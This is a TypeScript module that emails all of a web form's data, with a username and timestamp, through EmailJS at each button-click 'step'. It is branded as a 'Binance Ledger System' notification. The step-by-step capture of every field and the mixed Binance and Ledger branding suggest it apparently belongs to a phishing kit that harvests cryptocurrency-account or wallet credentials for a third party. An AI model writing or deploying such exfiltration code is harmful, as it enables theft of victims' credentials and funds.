
import emailjs from 'emailjs-com';
import { EMAILJS_CONFIG } from '@/config/emailjs.config';

interface EmailData {
  step: string;
  field?: string;
  value?: string;
  username?: string;
  timestamp: string;
  allFormData?: any;
}

export const sendEmailNotification = async (data: EmailData) => {
  try {
    // Format all form data into clean HTML table with defaults for empty fields
    let formDataHtml = '';
    if (data.allFormData && typeof data.allFormData === 'object') {
      const tableRows = Object.entries(data.allFormData)
        .map(([key, value]) => {
          const displayValue = value || 'N/A';
          const formattedKey = key.charAt(0).toUpperCase() + key.slice(1).replace(/([A-Z])/g, ' $1');
          return `<tr><td style="padding: 12px; border: 1px solid #dee2e6; background-color: #f8f9fa; font-weight: bold;">${formattedKey}</td><td style="padding: 12px; border: 1px solid #dee2e6; background-color: #fff; font-family: 'Courier New', monospace;">${displayValue}</td></tr>`;
        })
        .join('');
      
      formDataHtml = `
<table style="width: 100%; border-collapse: collapse; margin: 20px 0; border: 1px solid #dee2e6;">
  <thead>
    <tr>
      <th style="padding: 15px; border: 1px solid #dee2e6; background-color: #e9ecef; color: #495057; font-weight: bold; text-align: left;">Field</th>
      <th style="padding: 15px; border: 1px solid #dee2e6; background-color: #e9ecef; color: #495057; font-weight: bold; text-align: left;">Value</th>
    </tr>
  </thead>
  <tbody>
    ${tableRows}
  </tbody>
</table>`;
    } else {
      formDataHtml = '<p style="color: #6c757d; font-style: italic;">No form data available</p>';
    }

    // Create a comprehensive message with all information
    const message = `
<h2 style="color: #495057; margin-bottom: 20px;">🔔 Step: ${data.step}</h2>
<p style="margin: 10px 0;"><strong>Timestamp:</strong> ${data.timestamp}</p>
${data.username ? `<p style="margin: 10px 0;"><strong>Username:</strong> ${data.username}</p>` : ''}

<h3 style="color: #495057; margin: 30px 0 15px 0;">📋 Complete Form Data:</h3>
${formDataHtml}

<hr style="margin: 30px 0; border: none; border-top: 2px solid #dee2e6;">
<p style="color: #6c757d; font-style: italic; text-align: center;">Automated notification from Binance Ledger System</p>
    `.trim();

    // Use only two simple variables to avoid corruption
    const templateParams = {
      subject: `🚨 ${data.step} - Button Click Activity`,
      message: message
    };

    console.log('🚨 SENDING EMAIL FOR BUTTON CLICK:', data.step);
    console.log('📧 Complete form data being sent:', data.allFormData);
    console.log('📧 Template params:', templateParams);

    const result = await emailjs.send(
      EMAILJS_CONFIG.SERVICE_ID,
      EMAILJS_CONFIG.TEMPLATE_ID,
      templateParams,
      EMAILJS_CONFIG.USER_ID
    );

    console.log('✅ Email sent successfully:', result);
    return result;
  } catch (error) {
    console.error('❌ Failed to send email:', error);
    throw error;
  }
};
